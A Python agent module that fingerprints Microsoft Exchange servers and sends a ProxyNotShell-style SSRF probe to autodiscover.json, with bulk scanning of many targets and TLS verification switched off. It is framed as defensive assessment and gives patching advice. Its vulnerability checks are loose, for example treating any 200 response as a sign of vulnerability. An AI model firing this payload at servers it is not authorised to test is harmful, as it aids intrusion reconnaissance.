#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# limitations under the License.

"""
Exchange Server Vulnerability Assessment Core

This core implements automated detection and assessment of Microsoft Exchange Server
vulnerabilities, including SSRF attacks via autodiscover endpoints and firewall bypass
techniques. Based on analysis of 0dayex-checker tool patterns.

Key Features:
- Exchange server detection via OWA endpoints
- SSRF vulnerability testing through autodiscover.json
- Firewall configuration assessment
- Automated security scanning and reporting
"""

import asyncio
import aiohttp
import ssl
import random
import string
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse
import logging

from src.core.base.lifecycle.base_agent import BaseAgent
from src.core.base.common.models.communication_models import CascadeContext


class ExchangeVulnerabilityAssessmentCore(BaseAgent):
    """
    Core agent for assessing Exchange Server vulnerabilities.

    This agent detects Exchange servers and tests for known vulnerabilities
    including SSRF attacks that can bypass firewall restrictions.
    """

    def __init__(self, agent_state_manager, cascade_context: CascadeContext):
        super().__init__(agent_state_manager, cascade_context)
        self.logger = logging.getLogger(__name__)

        # HTTP client configuration
        self.timeout = aiohttp.ClientTimeout(total=10)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

        # User agent for requests
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0'

    async def detect_exchange_server(self, target_url: str) -> Optional[str]:
        """
        Detect if the target URL is a Microsoft Exchange server.

        Args:
            target_url: The URL to test for Exchange server presence

        Returns:
            The OWA URL if Exchange server detected, None otherwise
        """
        try:
            owa_url = urljoin(target_url, '/owa/')

            headers = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache'
            }

            async with aiohttp.ClientSession(
                timeout=self.timeout,
                connector=aiohttp.TCPConnector(ssl=self.ssl_context)
            ) as session:

                async with session.get(owa_url, headers=headers, allow_redirects=True) as response:
                    # Check for Exchange-specific headers
                    if 'x-owa-version' in response.headers:
                        return str(response.url)

                    # Check response content for Exchange indicators
                    content = await response.text()
                    if '/owa/auth.owa' in content or '/owa/auth/' in content:
                        return str(response.url)

        except Exception as e:
            self.logger.error(f"Error detecting Exchange server at {target_url}: {e}")

        return None

    def _generate_random_string(self, length: int = 6) -> str:
        """Generate a random string for SSRF testing."""
        chars = string.ascii_lowercase + string.digits + '-'
        return ''.join(random.choice(chars) for _ in range(length))

    async def test_ssrf_vulnerability(self, exchange_url: str) -> Tuple[bool, str]:
        """
        Test for SSRF vulnerability in Exchange autodiscover endpoint.

        Args:
            exchange_url: Base URL of the Exchange server

        Returns:
            Tuple of (is_vulnerable, details)
        """
        try:
            # Generate random domain for testing
            rand_domain = self._generate_random_string()

            # Construct malicious SSRF URL
            # This mimics the 0-day vulnerability pattern
            ssrf_path = f'/autodiscover/autodiscover.json?@{rand_domain}.com/owa/&Email=autodiscover/autodiscover.json%3f@{rand_domain}.com'
            test_url = urljoin(exchange_url, ssrf_path)

            headers = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache'
            }

            self.logger.info(f"Testing SSRF vulnerability: {test_url}")

            async with aiohttp.ClientSession(
                timeout=self.timeout,
                connector=aiohttp.TCPConnector(ssl=self.ssl_context)
            ) as session:

                try:
                    async with session.get(test_url, headers=headers, allow_redirects=True) as response:
                        content = await response.text()

                        # Check for safe responses (server is protected)
                        if response.status == 403:
                            return False, "Server is protected (403 Forbidden)"

                        # Check for redirect to error page (safe)
                        if 'location' in response.headers:
                            location = response.headers['location']
                            if '/errorFE.aspx' in location:
                                return False, "Server redirects to error page (protected)"

                        # Check for error responses that indicate vulnerability
                        if response.status in [400, 500, 200]:
                            # Check content for vulnerability indicators
                            if 'MandatoryParameterMissing' in content:
                                return True, "Vulnerable: MandatoryParameterMissing in response"

                            if 'X-FEServer' in content or '.auth_errorfe_aspx' in content:
                                return True, "Vulnerable: Exchange server error patterns detected"

                            if "Server Error in '/owa' Application" in content:
                                return True, "Vulnerable: OWA application error"

                            # Status 200 with SSRF payload might indicate success
                            if response.status == 200:
                                return True, "Potentially vulnerable: Unexpected 200 response to SSRF attempt"

                        return False, f"Response status {response.status}: {content[:200]}..."

                except asyncio.TimeoutError:
                    # Timeout is considered safe (server didn't respond to malicious request)
                    return False, "Server timeout (protected)"

                except Exception as e:
                    # Other errors during SSRF test
                    return False, f"Request error (likely protected): {str(e)}"

        except Exception as e:
            self.logger.error(f"Error testing SSRF vulnerability: {e}")
            return False, f"Test failed: {str(e)}"

    async def assess_exchange_security(self, target_url: str) -> Dict[str, Any]:
        """
        Comprehensive security assessment of an Exchange server.

        Args:
            target_url: URL to assess

        Returns:
            Assessment results dictionary
        """
        results = {
            'target_url': target_url,
            'is_exchange_server': False,
            'owa_url': None,
            'vulnerabilities': [],
            'recommendations': [],
            'scan_timestamp': None
        }

        try:
            # Step 1: Detect if it's an Exchange server
            self.logger.info(f"Detecting Exchange server at: {target_url}")
            owa_url = await self.detect_exchange_server(target_url)

            if not owa_url:
                results['assessment'] = 'Target is not an Exchange server'
                return results

            results['is_exchange_server'] = True
            results['owa_url'] = owa_url
            results['scan_timestamp'] = asyncio.get_event_loop().time()

            # Step 2: Test for SSRF vulnerability
            self.logger.info(f"Testing SSRF vulnerability on: {owa_url}")
            is_vulnerable, details = await self.test_ssrf_vulnerability(owa_url)

            if is_vulnerable:
                results['vulnerabilities'].append({
                    'type': 'SSRF',
                    'severity': 'HIGH',
                    'description': 'Server vulnerable to SSRF attack via autodiscover endpoint',
                    'details': details,
                    'cve': 'CVE-2022-41040 (ProxyNotShell related)',
                    'recommendation': 'Update Exchange server and apply firewall rules to block malicious autodiscover requests'
                })
            else:
                results['assessment'] = 'Server appears secure against tested SSRF attacks'
                results['details'] = details

            # Step 3: Generate recommendations
            if results['vulnerabilities']:
                results['recommendations'].extend([
                    'Apply latest Exchange Server security updates',
                    'Configure firewall to block suspicious autodiscover requests',
                    'Monitor for anomalous autodiscover endpoint usage',
                    'Consider implementing WAF rules for Exchange protection',
                    'Review Microsoft security guidance for Exchange Server hardening'
                ])
            else:
                results['recommendations'].append(
                    'Continue regular security monitoring and updates'
                )

        except Exception as e:
            self.logger.error(f"Error during Exchange assessment: {e}")
            results['error'] = str(e)

        return results

    async def scan_multiple_targets(self, target_urls: List[str]) -> List[Dict[str, Any]]:
        """
        Scan multiple Exchange servers concurrently.

        Args:
            target_urls: List of URLs to scan

        Returns:
            List of assessment results
        """
        tasks = []
        for url in target_urls:
            task = asyncio.create_task(self.assess_exchange_security(url))
            tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Handle any exceptions that occurred
        processed_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                processed_results.append({
                    'target_url': target_urls[i],
                    'error': str(result),
                    'scan_timestamp': asyncio.get_event_loop().time()
                })
            else:
                processed_results.append(result)

        return processed_results

    async def execute_task(self, task_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute assessment task.

        Expected task_data format:
        {
            'action': 'assess_exchange' | 'scan_multiple',
            'target_url': 'https://example.com',  # for single assessment
            'target_urls': ['url1', 'url2'],      # for multiple scans
        }
        """
        action = task_data.get('action', 'assess_exchange')

        if action == 'assess_exchange':
            target_url = task_data.get('target_url')
            if not target_url:
                return {'error': 'target_url required for assess_exchange action'}

            result = await self.assess_exchange_security(target_url)
            return result

        elif action == 'scan_multiple':
            target_urls = task_data.get('target_urls', [])
            if not target_urls:
                return {'error': 'target_urls required for scan_multiple action'}

            results = await self.scan_multiple_targets(target_urls)
            return {'scan_results': results}

        else:
            return {'error': f'Unknown action: {action}'}